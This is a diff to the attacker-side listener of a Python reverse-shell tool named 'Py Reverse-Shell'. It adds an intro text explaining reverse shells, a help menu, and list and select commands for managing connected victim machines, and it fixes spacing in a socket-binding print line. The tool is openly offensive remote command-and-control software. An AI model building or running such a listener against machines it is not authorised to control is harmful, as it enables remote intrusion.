@@ -14,6 +14,18 @@ queue = Queue()
 connections = []
 addresses = []
 
+# Initializing a dictionary of built-in commands
+commands = {
+    'Intro': '\t\t\twelcome to \'Py Reverse-Shell\' \n A reverse shell is a type of shell in which the target machine\n'
+             ' communicates back to the attacking machine. The attacking machine has a listener port on which\n'
+             ' it receives the connection, which by using, code or command execution is achieved\n'
+             '>>Type \'help\' for a list of built in commands',
+    'exit': 'quit your current session\n',
+    'list': 'list all connections\n',
+    'select': 'select a specific client, takes -id\n',
+    'help': 'show this help'
+}
+
 
 def socket_create():
     try:
@@ -32,7 +44,7 @@ def socket_bind():
         global host
         global port
         global connection
-        print("Binding socket to the port: "+ str(port))
+        print("Binding socket to the port: " + str(port))
         connection.bind((host, port))
         connection.listen(10)
     except socket.error as sockErr:
@@ -59,8 +71,14 @@ def accept_connections():
 
 # Interactive shell for sending commands remotely
 def start_shell():
+    print(commands['Intro'])
     while True:
         cmd = input("shell:~$ ")
+        if cmd == 'help':
+            print('exit: ', commands['exit'])
+            print('list: ', commands['list'])
+            print('select: ', commands['select'])
+            print('help: ', commands['help'])
         if cmd == 'list':
             list_all_connections()
             continue
